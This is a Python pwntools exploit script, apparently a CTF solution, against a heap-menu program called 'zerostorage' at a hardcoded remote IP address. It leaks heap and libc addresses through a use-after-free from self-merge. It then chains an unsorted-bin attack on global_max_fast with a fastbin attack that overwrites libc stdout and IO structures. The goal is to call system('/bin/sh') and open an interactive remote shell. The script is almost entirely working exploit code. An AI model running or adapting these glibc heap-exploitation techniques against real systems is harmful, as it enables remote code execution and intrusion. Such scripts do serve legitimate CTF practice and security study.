#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./zerostorage"
#libc = ELF("./libc.so.6")

unsorted_bin_off = 0x3c4b78
global_max_fast_off = 0x3c67f8
cache_size_off = 0x3c41f0
io_stdin_off = 0x3c49b4
system_off = 0x45390
io_stdout_off = 0x3c5620
io_stdfil_1_lock_off = 0x3c6780
io_file_jumps_off= 0x3c36e0
nl_global_locale_off = 0x3c5420
nl_clctype_class_off = 0x1775e0

sysmem = 0x21000
stdout = 0xfbad2887

#p = process(elf)
p = remote("182.254.230.85", 5678)

def insert(s):
    p.recvuntil("Your choice: ")
    p.sendline("1")
    p.recvuntil("Length of new entry: ")
    p.sendline(str(len(s)))
    p.recvuntil("Enter your data: ")
    p.send(s)

def update(idx, s):
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("Entry ID: ")
    p.sendline(str(idx))
    p.recvuntil("Length of entry: ")
    p.sendline(str(len(s)))
    p.recvuntil("Enter your data: ")
    p.send(s)

def merge(idx1, idx2):
    p.recvuntil("Your choice: ")
    p.sendline("3")
    p.recvuntil("Merge from Entry ID: ")
    p.sendline(str(idx1))
    p.recvuntil("Merge to Entry ID: ")
    p.sendline(str(idx2))

def delete(idx):
    p.recvuntil("Your choice: ")
    p.sendline("4")
    p.recvuntil("Entry ID: ")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil("Your choice: ")
    p.sendline("5")
    p.recvuntil("Entry ID: ")
    p.sendline(str(idx))
    p.recvuntil("Entry No."+str(idx)+":\n")


# leak libc

insert(p8(0)*0x8)
insert(p8(0)*0x8)
insert(p8(0)*0x8)
insert(p8(0)*0x8)
delete(2)
merge(0, 0)
view(2)

heap_base = u64(p.recv(8))-0x120
unsorted_bin_addr = u64(p.recv(8))
libc_base = unsorted_bin_addr-unsorted_bin_off
log.info("heap_base: "+hex(heap_base))
log.info("libc_base: "+hex(libc_base))

top_chunk_off = 0x11580
top_chunk_addr = heap_base+top_chunk_off
log.info("top_chunk: "+hex(top_chunk_addr))

io_stdout_addr = libc_base+io_stdout_off
io_lock_addr = libc_base+io_stdfil_1_lock_off
io_file_jump_addr = libc_base+io_file_jumps_off
nl_clctype_class_addr = libc_base+nl_clctype_class_off

system_addr = libc_base+system_off

# fastbin attack

insert(p8(0)*0x10)
insert(p8(0)*0x10)

insert(p8(0)*0x1000)
insert(p8(0)*0x10)
merge(6, 6)
insert(p8(0)*0x1000)
merge(5, 6)
insert(p8(0)*0x1000)
merge(5, 8)
insert(p8(0)*0xff0)
merge(5, 6)

insert(p8(0)*0x1000)
insert(p8(0)*0x10)

insert(p8(0)*0x1000)
insert(p8(0)*0x1000)
merge(9, 10)

insert(p8(0)*0x1000)
insert(p8(0)*0x10)

insert(p8(0)*0x1000)
insert(p8(0)*0xff0)
merge(12, 13)

insert(p8(0)*0x1000)
insert(p8(0)*0x10)

insert(p8(0)*0x1000)
insert(p8(0)*0x1000)
merge(15, 16)

insert(p8(0)*0x1000)
insert(p8(0)*0x10)

payload = p8(0)*0x1b0
payload += p64(sysmem)
payload += p8(0)*(0x2a0-0x8-len(payload))
payload += p64(nl_clctype_class_addr)
payload += p8(0)*(0x438-0x8-len(payload))
payload += p64(stdout)
payload += p8(0)*(0x4a8-0x8-len(payload))
payload += p32(0x1)
payload += p8(0)*(0x4c0-0x8-len(payload))
payload += p64(io_lock_addr)
payload += p8(0)*(0x510-0x8-len(payload))
payload += p64(io_file_jump_addr)
payload += p8(0)*(0x520-0x8-len(payload))
payload += p64(io_stdout_addr)
payload += p8(0)*(0x1000-len(payload))
insert(payload)

payload = p8(0)*(0x910-0x8)
payload += p64(system_addr)
payload += p8(0)*(0x980-0x8-len(payload))
payload += p64(top_chunk_addr)+p64(0)
payload += p64(unsorted_bin_addr)*2
payload += p8(0)*(0xff0-len(payload))
insert(payload)
merge(18, 19)

insert(p8(0)*0x1000)
insert("/bin/sh")

##-- unsorted_bin_attack

delete(4)

payload = p64(unsorted_bin_addr)
payload += p64(libc_base+global_max_fast_off-0x10)
update(2, payload)

insert(p8(0)*0x10)
##--

delete(8)
update(7, p64(libc_base+cache_size_off)+p64(0))

merge(11, 14)
merge(17, 20)

p.sendline("2")
p.sendline("19")
p.sendline("256")

p.interactive()
